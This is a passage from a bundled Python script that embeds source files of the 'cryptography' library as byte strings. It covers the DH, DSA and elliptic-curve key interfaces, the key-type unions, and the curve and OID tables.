DHPublicNumbers:\r\n        return self._public_numbers\r\n\r\n    @property\r\n    def x(self) -> int:\r\n        return self._x\r\n\r\n\r\nclass DHParameters(metaclass=abc.ABCMeta):\r\n    @abc.abstractmethod\r\n    def generate_private_key(self) -> "DHPrivateKey":\r\n        """\r\n        Generates and returns a DHPrivateKey.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def parameter_bytes(\r\n        self,\r\n        encoding: _serialization.Encoding,\r\n        format: _serialization.ParameterFormat,\r\n    ) -> bytes:\r\n        """\r\n        Returns the parameters serialized as bytes.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def parameter_numbers(self) -> DHParameterNumbers:\r\n        """\r\n        Returns a DHParameterNumbers.\r\n        """\r\n\r\n\r\nDHParametersWithSerialization = DHParameters\r\n\r\n\r\nclass DHPublicKey(metaclass=abc.ABCMeta):\r\n    @abc.abstractproperty\r\n    def key_size(self) -> int:\r\n        """\r\n        The bit length of the prime modulus.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def parameters(self) -> DHParameters:\r\n        """\r\n        The DHParameters object associated with this public key.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def public_numbers(self) -> DHPublicNumbers:\r\n        """\r\n        Returns a DHPublicNumbers.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def public_bytes(\r\n        self,\r\n        encoding: _serialization.Encoding,\r\n        format: _serialization.PublicFormat,\r\n    ) -> bytes:\r\n        """\r\n        Returns the key serialized as bytes.\r\n        """\r\n\r\n\r\nDHPublicKeyWithSerialization = DHPublicKey\r\n\r\n\r\nclass DHPrivateKey(metaclass=abc.ABCMeta):\r\n    @abc.abstractproperty\r\n    def key_size(self) -> int:\r\n        """\r\n        The bit length of the prime modulus.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def public_key(self) -> DHPublicKey:\r\n        """\r\n        The DHPublicKey associated with this private key.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def parameters(self) -> DHParameters:\r\n        """\r\n        The DHParameters object associated with this private key.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def exchange(self, peer_public_key: DHPublicKey) -> bytes:\r\n        """\r\n        Given peer\'s DHPublicKey, carry out the key exchange and\r\n        return shared key as bytes.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def private_numbers(self) -> DHPrivateNumbers:\r\n        """\r\n        Returns a DHPrivateNumbers.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def private_bytes(\r\n        self,\r\n        encoding: _serialization.Encoding,\r\n        format: _serialization.PrivateFormat,\r\n        encryption_algorithm: _serialization.KeySerializationEncryption,\r\n    ) -> bytes:\r\n        """\r\n        Returns the key serialized as bytes.\r\n        """\r\n\r\n\r\nDHPrivateKeyWithSerialization = DHPrivateKey\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/asymmetric/types.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport typing\r\n\r\nfrom cryptography.hazmat.primitives.asymmetric import (\r\n    dh,\r\n    dsa,\r\n    ec,\r\n    ed25519,\r\n    ed448,\r\n    rsa,\r\n    x25519,\r\n    x448,\r\n)\r\n\r\n\r\n# Every asymmetric key type\r\nPUBLIC_KEY_TYPES = typing.Union[\r\n    dh.DHPublicKey,\r\n    dsa.DSAPublicKey,\r\n    rsa.RSAPublicKey,\r\n    ec.EllipticCurvePublicKey,\r\n    ed25519.Ed25519PublicKey,\r\n    ed448.Ed448PublicKey,\r\n    x25519.X25519PublicKey,\r\n    x448.X448PublicKey,\r\n]\r\n# Every asymmetric key type\r\nPRIVATE_KEY_TYPES = typing.Union[\r\n    dh.DHPrivateKey,\r\n    ed25519.Ed25519PrivateKey,\r\n    ed448.Ed448PrivateKey,\r\n    rsa.RSAPrivateKey,\r\n    dsa.DSAPrivateKey,\r\n    ec.EllipticCurvePrivateKey,\r\n    x25519.X25519PrivateKey,\r\n    x448.X448PrivateKey,\r\n]\r\n# Just the key types we allow to be used for x509 signing. This mirrors\r\n# the certificate public key types\r\nCERTIFICATE_PRIVATE_KEY_TYPES = typing.Union[\r\n    ed25519.Ed25519PrivateKey,\r\n    ed448.Ed448PrivateKey,\r\n    rsa.RSAPrivateKey,\r\n    dsa.DSAPrivateKey,\r\n    ec.EllipticCurvePrivateKey,\r\n]\r\n# Just the key types we allow to be used for x509 signing. This mirrors\r\n# the certificate private key types\r\nCERTIFICATE_ISSUER_PUBLIC_KEY_TYPES = typing.Union[\r\n    dsa.DSAPublicKey,\r\n    rsa.RSAPublicKey,\r\n    ec.EllipticCurvePublicKey,\r\n    ed25519.Ed25519PublicKey,\r\n    ed448.Ed448PublicKey,\r\n]\r\n# This type removes DHPublicKey. x448/x25519 can be a public key\r\n# but cannot be used in signing so they are allowed here.\r\nCERTIFICATE_PUBLIC_KEY_TYPES = typing.Union[\r\n    dsa.DSAPublicKey,\r\n    rsa.RSAPublicKey,\r\n    ec.EllipticCurvePublicKey,\r\n    ed25519.Ed25519PublicKey,\r\n    ed448.Ed448PublicKey,\r\n    x25519.X25519PublicKey,\r\n    x448.X448PublicKey,\r\n]\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/asymmetric/dsa.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport abc\r\nimport typing\r\n\r\nfrom cryptography.hazmat.primitives import _serialization, hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import (\r\n    utils as asym_utils,\r\n)\r\n\r\n\r\nclass DSAParameters(metaclass=abc.ABCMeta):\r\n    @abc.abstractmethod\r\n    def generate_private_key(self) -> "DSAPrivateKey":\r\n        """\r\n        Generates and returns a DSAPrivateKey.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def parameter_numbers(self) -> "DSAParameterNumbers":\r\n        """\r\n        Returns a DSAParameterNumbers.\r\n        """\r\n\r\n\r\nDSAParametersWithNumbers = DSAParameters\r\n\r\n\r\nclass DSAPrivateKey(metaclass=abc.ABCMeta):\r\n    @abc.abstractproperty\r\n    def key_size(self) -> int:\r\n        """\r\n        The bit length of the prime modulus.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def public_key(self) -> "DSAPublicKey":\r\n        """\r\n        The DSAPublicKey associated with this private key.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def parameters(self) -> DSAParameters:\r\n        """\r\n        The DSAParameters object associated with this private key.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def sign(\r\n        self,\r\n        data: bytes,\r\n        algorithm: typing.Union[asym_utils.Prehashed, hashes.HashAlgorithm],\r\n    ) -> bytes:\r\n        """\r\n        Signs the data\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def private_numbers(self) -> "DSAPrivateNumbers":\r\n        """\r\n        Returns a DSAPrivateNumbers.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def private_bytes(\r\n        self,\r\n        encoding: _serialization.Encoding,\r\n        format: _serialization.PrivateFormat,\r\n        encryption_algorithm: _serialization.KeySerializationEncryption,\r\n    ) -> bytes:\r\n        """\r\n        Returns the key serialized as bytes.\r\n        """\r\n\r\n\r\nDSAPrivateKeyWithSerialization = DSAPrivateKey\r\n\r\n\r\nclass DSAPublicKey(metaclass=abc.ABCMeta):\r\n    @abc.abstractproperty\r\n    def key_size(self) -> int:\r\n        """\r\n        The bit length of the prime modulus.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def parameters(self) -> DSAParameters:\r\n        """\r\n        The DSAParameters object associated with this public key.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def public_numbers(self) -> "DSAPublicNumbers":\r\n        """\r\n        Returns a DSAPublicNumbers.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def public_bytes(\r\n        self,\r\n        encoding: _serialization.Encoding,\r\n        format: _serialization.PublicFormat,\r\n    ) -> bytes:\r\n        """\r\n        Returns the key serialized as bytes.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def verify(\r\n        self,\r\n        signature: bytes,\r\n        data: bytes,\r\n        algorithm: typing.Union[asym_utils.Prehashed, hashes.HashAlgorithm],\r\n    ) -> None:\r\n        """\r\n        Verifies the signature of the data.\r\n        """\r\n\r\n\r\nDSAPublicKeyWithSerialization = DSAPublicKey\r\n\r\n\r\nclass DSAParameterNumbers:\r\n    def __init__(self, p: int, q: int, g: int):\r\n        if (\r\n            not isinstance(p, int)\r\n            or not isinstance(q, int)\r\n            or not isinstance(g, int)\r\n        ):\r\n            raise TypeError(\r\n                "DSAParameterNumbers p, q, and g arguments must be integers."\r\n            )\r\n\r\n        self._p = p\r\n        self._q = q\r\n        self._g = g\r\n\r\n    @property\r\n    def p(self) -> int:\r\n        return self._p\r\n\r\n    @property\r\n    def q(self) -> int:\r\n        return self._q\r\n\r\n    @property\r\n    def g(self) -> int:\r\n        return self._g\r\n\r\n    def parameters(self, backend: typing.Any = None) -> DSAParameters:\r\n        from cryptography.hazmat.backends.openssl.backend import (\r\n            backend as ossl,\r\n        )\r\n\r\n        return ossl.load_dsa_parameter_numbers(self)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, DSAParameterNumbers):\r\n            return NotImplemented\r\n\r\n        return self.p == other.p and self.q == other.q and self.g == other.g\r\n\r\n    def __repr__(self) -> str:\r\n        return (\r\n            "<DSAParameterNumbers(p={self.p}, q={self.q}, "\r\n            "g={self.g})>".format(self=self)\r\n        )\r\n\r\n\r\nclass DSAPublicNumbers:\r\n    def __init__(self, y: int, parameter_numbers: DSAParameterNumbers):\r\n        if not isinstance(y, int):\r\n            raise TypeError("DSAPublicNumbers y argument must be an integer.")\r\n\r\n        if not isinstance(parameter_numbers, DSAParameterNumbers):\r\n            raise TypeError(\r\n                "parameter_numbers must be a DSAParameterNumbers instance."\r\n            )\r\n\r\n        self._y = y\r\n        self._parameter_numbers = parameter_numbers\r\n\r\n    @property\r\n    def y(self) -> int:\r\n        return self._y\r\n\r\n    @property\r\n    def parameter_numbers(self) -> DSAParameterNumbers:\r\n        return self._parameter_numbers\r\n\r\n    def public_key(self, backend: typing.Any = None) -> DSAPublicKey:\r\n        from cryptography.hazmat.backends.openssl.backend import (\r\n            backend as ossl,\r\n        )\r\n\r\n        return ossl.load_dsa_public_numbers(self)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, DSAPublicNumbers):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self.y == other.y\r\n            and self.parameter_numbers == other.parameter_numbers\r\n        )\r\n\r\n    def __repr__(self) -> str:\r\n        return (\r\n            "<DSAPublicNumbers(y={self.y}, "\r\n            "parameter_numbers={self.parameter_numbers})>".format(self=self)\r\n        )\r\n\r\n\r\nclass DSAPrivateNumbers:\r\n    def __init__(self, x: int, public_numbers: DSAPublicNumbers):\r\n        if not isinstance(x, int):\r\n            raise TypeError("DSAPrivateNumbers x argument must be an integer.")\r\n\r\n        if not isinstance(public_numbers, DSAPublicNumbers):\r\n            raise TypeError(\r\n                "public_numbers must be a DSAPublicNumbers instance."\r\n            )\r\n        self._public_numbers = public_numbers\r\n        self._x = x\r\n\r\n    @property\r\n    def x(self) -> int:\r\n        return self._x\r\n\r\n    @property\r\n    def public_numbers(self) -> DSAPublicNumbers:\r\n        return self._public_numbers\r\n\r\n    def private_key(self, backend: typing.Any = None) -> DSAPrivateKey:\r\n        from cryptography.hazmat.backends.openssl.backend import (\r\n            backend as ossl,\r\n        )\r\n\r\n        return ossl.load_dsa_private_numbers(self)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, DSAPrivateNumbers):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self.x == other.x and self.public_numbers == other.public_numbers\r\n        )\r\n\r\n\r\ndef generate_parameters(\r\n    key_size: int, backend: typing.Any = None\r\n) -> DSAParameters:\r\n    from cryptography.hazmat.backends.openssl.backend import backend as ossl\r\n\r\n    return ossl.generate_dsa_parameters(key_size)\r\n\r\n\r\ndef generate_private_key(\r\n    key_size: int, backend: typing.Any = None\r\n) -> DSAPrivateKey:\r\n    from cryptography.hazmat.backends.openssl.backend import backend as ossl\r\n\r\n    return ossl.generate_dsa_private_key_and_parameters(key_size)\r\n\r\n\r\ndef _check_dsa_parameters(parameters: DSAParameterNumbers) -> None:\r\n    if parameters.p.bit_length() not in [1024, 2048, 3072, 4096]:\r\n        raise ValueError(\r\n            "p must be exactly 1024, 2048, 3072, or 4096 bits long"\r\n        )\r\n    if parameters.q.bit_length() not in [160, 224, 256]:\r\n        raise ValueError("q must be exactly 160, 224, or 256 bits long")\r\n\r\n    if not (1 < parameters.g < parameters.p):\r\n        raise ValueError("g, p don\'t satisfy 1 < g < p.")\r\n\r\n\r\ndef _check_dsa_private_numbers(numbers: DSAPrivateNumbers) -> None:\r\n    parameters = numbers.public_numbers.parameter_numbers\r\n    _check_dsa_parameters(parameters)\r\n    if numbers.x <= 0 or numbers.x >= parameters.q:\r\n        raise ValueError("x must be > 0 and < q.")\r\n\r\n    if numbers.public_numbers.y != pow(parameters.g, numbers.x, parameters.p):\r\n        raise ValueError("y must be equal to (g ** x % p).")\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/asymmetric/utils.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nfrom cryptography.hazmat.bindings._rust import asn1\r\nfrom cryptography.hazmat.primitives import hashes\r\n\r\n\r\ndecode_dss_signature = asn1.decode_dss_signature\r\nencode_dss_signature = asn1.encode_dss_signature\r\n\r\n\r\nclass Prehashed:\r\n    def __init__(self, algorithm: hashes.HashAlgorithm):\r\n        if not isinstance(algorithm, hashes.HashAlgorithm):\r\n            raise TypeError("Expected instance of HashAlgorithm.")\r\n\r\n        self._algorithm = algorithm\r\n        self._digest_size = algorithm.digest_size\r\n\r\n    @property\r\n    def digest_size(self) -> int:\r\n        return self._digest_size\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/asymmetric/ec.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport abc\r\nimport typing\r\nimport warnings\r\n\r\nfrom cryptography import utils\r\nfrom cryptography.hazmat._oid import ObjectIdentifier\r\nfrom cryptography.hazmat.primitives import _serialization, hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import (\r\n    utils as asym_utils,\r\n)\r\n\r\n\r\nclass EllipticCurveOID:\r\n    SECP192R1 = ObjectIdentifier("1.2.840.10045.3.1.1")\r\n    SECP224R1 = ObjectIdentifier("1.3.132.0.33")\r\n    SECP256K1 = ObjectIdentifier("1.3.132.0.10")\r\n    SECP256R1 = ObjectIdentifier("1.2.840.10045.3.1.7")\r\n    SECP384R1 = ObjectIdentifier("1.3.132.0.34")\r\n    SECP521R1 = ObjectIdentifier("1.3.132.0.35")\r\n    BRAINPOOLP256R1 = ObjectIdentifier("1.3.36.3.3.2.8.1.1.7")\r\n    BRAINPOOLP384R1 = ObjectIdentifier("1.3.36.3.3.2.8.1.1.11")\r\n    BRAINPOOLP512R1 = ObjectIdentifier("1.3.36.3.3.2.8.1.1.13")\r\n    SECT163K1 = ObjectIdentifier("1.3.132.0.1")\r\n    SECT163R2 = ObjectIdentifier("1.3.132.0.15")\r\n    SECT233K1 = ObjectIdentifier("1.3.132.0.26")\r\n    SECT233R1 = ObjectIdentifier("1.3.132.0.27")\r\n    SECT283K1 = ObjectIdentifier("1.3.132.0.16")\r\n    SECT283R1 = ObjectIdentifier("1.3.132.0.17")\r\n    SECT409K1 = ObjectIdentifier("1.3.132.0.36")\r\n    SECT409R1 = ObjectIdentifier("1.3.132.0.37")\r\n    SECT571K1 = ObjectIdentifier("1.3.132.0.38")\r\n    SECT571R1 = ObjectIdentifier("1.3.132.0.39")\r\n\r\n\r\nclass EllipticCurve(metaclass=abc.ABCMeta):\r\n    @abc.abstractproperty\r\n    def name(self) -> str:\r\n        """\r\n        The name of the curve. e.g. secp256r1.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def key_size(self) -> int:\r\n        """\r\n        Bit size of a secret scalar for the curve.\r\n        """\r\n\r\n\r\nclass EllipticCurveSignatureAlgorithm(metaclass=abc.ABCMeta):\r\n    @abc.abstractproperty\r\n    def algorithm(\r\n        self,\r\n    ) -> typing.Union[asym_utils.Prehashed, hashes.HashAlgorithm]:\r\n        """\r\n        The digest algorithm used with this signature.\r\n        """\r\n\r\n\r\nclass EllipticCurvePrivateKey(metaclass=abc.ABCMeta):\r\n    @abc.abstractmethod\r\n    def exchange(\r\n        self, algorithm: "ECDH", peer_public_key: "EllipticCurvePublicKey"\r\n    ) -> bytes:\r\n        """\r\n        Performs a key exchange operation using the provided algorithm with the\r\n        provided peer\'s public key.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def public_key(self) -> "EllipticCurvePublicKey":\r\n        """\r\n        The EllipticCurvePublicKey for this private key.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def curve(self) -> EllipticCurve:\r\n        """\r\n        The EllipticCurve that this key is on.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def key_size(self) -> int:\r\n        """\r\n        Bit size of a secret scalar for the curve.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def sign(\r\n        self,\r\n        data: bytes,\r\n        signature_algorithm: EllipticCurveSignatureAlgorithm,\r\n    ) -> bytes:\r\n        """\r\n        Signs the data\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def private_numbers(self) -> "EllipticCurvePrivateNumbers":\r\n        """\r\n        Returns an EllipticCurvePrivateNumbers.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def private_bytes(\r\n        self,\r\n        encoding: _serialization.Encoding,\r\n        format: _serialization.PrivateFormat,\r\n        encryption_algorithm: _serialization.KeySerializationEncryption,\r\n    ) -> bytes:\r\n        """\r\n        Returns the key serialized as bytes.\r\n        """\r\n\r\n\r\nEllipticCurvePrivateKeyWithSerialization = EllipticCurvePrivateKey\r\n\r\n\r\nclass EllipticCurvePublicKey(metaclass=abc.ABCMeta):\r\n    @abc.abstractproperty\r\n    def curve(self) -> EllipticCurve:\r\n        """\r\n        The EllipticCurve that this key is on.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def key_size(self) -> int:\r\n        """\r\n        Bit size of a secret scalar for the curve.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def public_numbers(self) -> "EllipticCurvePublicNumbers":\r\n        """\r\n        Returns an EllipticCurvePublicNumbers.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def public_bytes(\r\n        self,\r\n        encoding: _serialization.Encoding,\r\n        format: _serialization.PublicFormat,\r\n    ) -> bytes:\r\n        """\r\n        Returns the key serialized as bytes.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def verify(\r\n        self,\r\n        signature: bytes,\r\n        data: bytes,\r\n        signature_algorithm: EllipticCurveSignatureAlgorithm,\r\n    ) -> None:\r\n        """\r\n        Verifies the signature of the data.\r\n        """\r\n\r\n    @classmethod\r\n    def from_encoded_point(\r\n        cls, curve: EllipticCurve, data: bytes\r\n    ) -> "EllipticCurvePublicKey":\r\n        utils._check_bytes("data", data)\r\n\r\n        if not isinstance(curve, EllipticCurve):\r\n            raise TypeError("curve must be an EllipticCurve instance")\r\n\r\n        if len(data) == 0:\r\n            raise ValueError("data must not be an empty byte string")\r\n\r\n        if data[0] not in [0x02, 0x03, 0x04]:\r\n            raise ValueError("Unsupported elliptic curve point type")\r\n\r\n        from cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n        return backend.load_elliptic_curve_public_bytes(curve, data)\r\n\r\n\r\nEllipticCurvePublicKeyWithSerialization = EllipticCurvePublicKey\r\n\r\n\r\nclass SECT571R1(EllipticCurve):\r\n    name = "sect571r1"\r\n    key_size = 570\r\n\r\n\r\nclass SECT409R1(EllipticCurve):\r\n    name = "sect409r1"\r\n    key_size = 409\r\n\r\n\r\nclass SECT283R1(EllipticCurve):\r\n    name = "sect283r1"\r\n    key_size = 283\r\n\r\n\r\nclass SECT233R1(EllipticCurve):\r\n    name = "sect233r1"\r\n    key_size = 233\r\n\r\n\r\nclass SECT163R2(EllipticCurve):\r\n    name = "sect163r2"\r\n    key_size = 163\r\n\r\n\r\nclass SECT571K1(EllipticCurve):\r\n    name = "sect571k1"\r\n    key_size = 571\r\n\r\n\r\nclass SECT409K1(EllipticCurve):\r\n    name = "sect409k1"\r\n    key_size = 409\r\n\r\n\r\nclass SECT283K1(EllipticCurve):\r\n    name = "sect283k1"\r\n    key_size = 283\r\n\r\n\r\nclass SECT233K1(EllipticCurve):\r\n    name = "sect233k1"\r\n    key_size = 233\r\n\r\n\r\nclass SECT163K1(EllipticCurve):\r\n    name = "sect163k1"\r\n    key_size = 163\r\n\r\n\r\nclass SECP521R1(EllipticCurve):\r\n    name = "secp521r1"\r\n    key_size = 521\r\n\r\n\r\nclass SECP384R1(EllipticCurve):\r\n    name = "secp384r1"\r\n    key_size = 384\r\n\r\n\r\nclass SECP256R1(EllipticCurve):\r\n    name = "secp256r1"\r\n    key_size = 256\r\n\r\n\r\nclass SECP256K1(EllipticCurve):\r\n    name = "secp256k1"\r\n    key_size = 256\r\n\r\n\r\nclass SECP224R1(EllipticCurve):\r\n    name = "secp224r1"\r\n    key_size = 224\r\n\r\n\r\nclass SECP192R1(EllipticCurve):\r\n    name = "secp192r1"\r\n    key_size = 192\r\n\r\n\r\nclass BrainpoolP256R1(EllipticCurve):\r\n    name = "brainpoolP256r1"\r\n    key_size = 256\r\n\r\n\r\nclass BrainpoolP384R1(EllipticCurve):\r\n    name = "brainpoolP384r1"\r\n    key_size = 384\r\n\r\n\r\nclass BrainpoolP512R1(EllipticCurve):\r\n    name = "brainpoolP512r1"\r\n    key_size = 512\r\n\r\n\r\n_CURVE_TYPES: typing.Dict[str, typing.Type[EllipticCurve]] = {\r\n    "prime192v1": SECP192R1,\r\n    "prime256v1": SECP256R1,\r\n    "secp192r1": SECP192R1,\r\n    "secp224r1": SECP224R1,\r\n    "secp256r1": SECP256R1,\r\n    "secp384r1": SECP384R1,\r\n    "secp521r1": SECP521R1,\r\n    "secp256k1": SECP256K1,\r\n    "sect163k1": SECT163K1,\r\n    "sect233k1": SECT233K1,\r\n    "sect283k1": SECT283K1,\r\n    "sect409k1": SECT409K1,\r\n    "sect571k1": SECT571K1,\r\n    "sect163r2": SECT163R2,\r\n    "sect233r1": SECT233R1,\r\n    "sect283r1": SECT283R1,\r\n    "sect409r1": SECT409R1,\r\n    "sect571r1": SECT571R1,\r\n    "brainpoolP256r1": BrainpoolP256R1,\r\n    "brainpoolP384r1": BrainpoolP384R1,\r\n    "brainpoolP512r1": BrainpoolP512R1,\r\n}\r\n\r\n\r\nclass ECDSA(EllipticCurveSignatureAlgorithm):\r\n    def __init__(\r\n        self,\r\n        algorithm: typing.Union[asym_utils.Prehashed, hashes.HashAlgorithm],\r\n    ):\r\n        self._algorithm = algorithm\r\n\r\n    @property\r\n    def algorithm(\r\n        self,\r\n    ) -> typing.Union[asym_utils.Prehashed, hashes.HashAlgorithm]:\r\n        return self._algorithm\r\n\r\n\r\ndef generate_private_key(\r\n    curve: EllipticCurve, backend: typing.Any = None\r\n) -> EllipticCurvePrivateKey:\r\n    from cryptography.hazmat.backends.openssl.backend import backend as ossl\r\n\r\n    return ossl.generate_elliptic_curve_private_key(curve)\r\n\r\n\r\ndef derive_private_key(\r\n    private_value: int,\r\n    curve: EllipticCurve,\r\n    backend: typing.Any = None,\r\n) -> EllipticCurvePrivateKey:\r\n    from cryptography.hazmat.backends.openssl.backend import backend as ossl\r\n\r\n    if not isinstance(private_value, int):\r\n        raise TypeError("private_value must be an integer type.")\r\n\r\n    if private_value <= 0:\r\n        raise ValueError("private_value must be a positive integer.")\r\n\r\n    if not isinstance(curve, EllipticCurve):\r\n        raise TypeError("curve must provide the EllipticCurve interface.")\r\n\r\n    return ossl.derive_elliptic_curve_private_key(private_value, curve)\r\n\r\n\r\nclass EllipticCurvePublicNumbers:\r\n    def __init__(self, x: int, y: int, curve: EllipticCurve):\r\n        if not isinstance(x, int) or not isinstance(y, int):\r\n            raise TypeError("x and y must be integers.")\r\n\r\n        if not isinstance(curve, EllipticCurve):\r\n            raise TypeError("curve must provide the EllipticCurve interface.")\r\n\r\n        self._y = y\r\n        self._x = x\r\n        self._curve = curve\r\n\r\n    def public_key(self, backend: typing.Any = None) -> EllipticCurvePublicKey:\r\n        from cryptography.hazmat.backends.openssl.backend import (\r\n            backend as ossl,\r\n        )\r\n\r\n        return ossl.load_elliptic_curve_public_numbers(self)\r\n\r\n    def encode_point(self) -> bytes:\r\n        warnings.warn(\r\n            "encode_point has been deprecated on EllipticCurvePublicNumbers"\r\n            " and will be removed in a future version. Please use "\r\n            "EllipticCurvePublicKey.public_bytes to obtain both "\r\n            "compressed and uncompressed point encoding.",\r\n            utils.PersistentlyDeprecated2019,\r\n            stacklevel=2,\r\n        )\r\n        # key_size is in bits. Convert to bytes and round up\r\n        byte_length = (self.curve.key_size + 7) // 8\r\n        return (\r\n            b"\\x04"\r\n            + utils.int_to_bytes(self.x, byte_length)\r\n            + utils.int_to_bytes(self.y, byte_length)\r\n        )\r\n\r\n    @classmethod\r\n    def from_encoded_point(\r\n        cls, curve: EllipticCurve, data: bytes\r\n    ) -> "EllipticCurvePublicNumbers":\r\n        if not isinstance(curve, EllipticCurve):\r\n            raise TypeError("curve must be an EllipticCurve instance")\r\n\r\n        warnings.warn(\r\n            "Support for unsafe construction of public numbers from "\r\n            "encoded data will be removed in a future version. "\r\n            "Please use EllipticCurvePublicKey.from_encoded_point",\r\n            utils.PersistentlyDeprecated2019,\r\n            stacklevel=2,\r\n        )\r\n\r\n        if data.startswith(b"\\x04"):\r\n            # key_size is in bits. Convert to bytes and round up\r\n            byte_length = (curve.key_size + 7) // 8\r\n            if len(data) == 2 * byte_length + 1:\r\n                x = int.from_bytes(data[1 : byte_length + 1], "big")\r\n                y = int.from_bytes(data[byte_length + 1 :], "big")\r\n                return cls(x, y, curve)\r\n            else:\r\n                raise ValueError("Invalid elliptic curve point data length")\r\n        else:\r\n            raise ValueError("Unsupported elliptic curve point type")\r\n\r\n    @property\r\n    def curve(self) -> EllipticCurve:\r\n        return self._curve\r\n\r\n    @property\r\n    def x(self) -> int:\r\n        return self._x\r\n\r\n    @property\r\n    def y(self) -> int:\r\n        return self._y\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, EllipticCurvePublicNumbers):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self.x == other.x\r\n            and self.y == other.y\r\n            and self.curve.name == other.curve.name\r\n            and self.curve.key_size == other.curve.key_size\r\n        )\r\n\r\n    def __hash__(self) -> int:\r\n        return hash((self.x, self.y, self.curve.name, self.curve.key_size))\r\n\r\n    def __repr__(self) -> str:\r\n        return (\r\n            "<EllipticCurvePublicNumbers(curve={0.curve.name}, x={0.x}, "\r\n            "y={0.y}>".format(self)\r\n        )\r\n\r\n\r\nclass EllipticCurvePrivateNumbers:\r\n    def __init__(\r\n        self, private_value: int, public_numbers: EllipticCurvePublicNumbers\r\n    ):\r\n        if not isinstance(private_value, int):\r\n            raise TypeError("private_value must be an integer.")\r\n\r\n        if not isinstance(public_numbers, EllipticCurvePublicNumbers):\r\n            raise TypeError(\r\n                "public_numbers must be an EllipticCurvePublicNumbers "\r\n                "instance."\r\n            )\r\n\r\n        self._private_value = private_value\r\n        self._public_numbers = public_numbers\r\n\r\n    def private_key(\r\n        self, backend: typing.Any = None\r\n    ) -> EllipticCurvePrivateKey:\r\n        from cryptography.hazmat.backends.openssl.backend import (\r\n            backend as ossl,\r\n        )\r\n\r\n        return ossl.load_elliptic_curve_private_numbers(self)\r\n\r\n    @property\r\n    def private_value(self) -> int:\r\n        return self._private_value\r\n\r\n    @property\r\n    def public_numbers(self) -> EllipticCurvePublicNumbers:\r\n        return self._public_numbers\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, EllipticCurvePrivateNumbers):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self.private_value == other.private_value\r\n            and self.public_numbers == other.public_numbers\r\n        )\r\n\r\n    def __hash__(self) -> int:\r\n        return hash((self.private_value, self.public_numbers))\r\n\r\n\r\nclass ECDH:\r\n    pass\r\n\r\n\r\n_OID_TO_CURVE = {\r\n    EllipticCurveOID.SECP192R1: SECP192R1,\r\n    EllipticCurveOID.SECP224R1: SECP224R1,\r\n    EllipticCurveOID.SECP256K1: SECP256K1,\r\n    EllipticCurveOID.SECP256R1: SECP256R1,\r\n    EllipticCurveOID.SECP384R1: SECP384R1,\r\n    EllipticCurveOID.SECP521R1: SECP521R1,\r\n    EllipticCurveOID.BRAINPOOLP256R1: BrainpoolP256R1,\r\n    EllipticCurveOID.BRAINPOOLP384R1: BrainpoolP384R1,\r\n    EllipticCurveOID.BRAINPOOLP512R1: BrainpoolP512R1,\r\n    EllipticCurveOID.SECT163K1: SECT163K1,\r\n    EllipticCurveOID.SECT163R2: SECT163R2,\r\n    EllipticCurveOID.SECT233K1: SECT233K1,\r\n    EllipticCurveOID.SECT233R1: SECT233R1,\r\n    EllipticCurveOID.SECT283K1: SECT283K1,\r\n    EllipticCurveOID.SECT283R1: SECT283R1,\r\n    EllipticCurveOID.SECT409K1: SECT409K1,\r\n    EllipticCurveOID.SECT409R1: SECT409R1,\r\n    EllipticCurveOID.SECT571K1: SECT571K1,\r\n    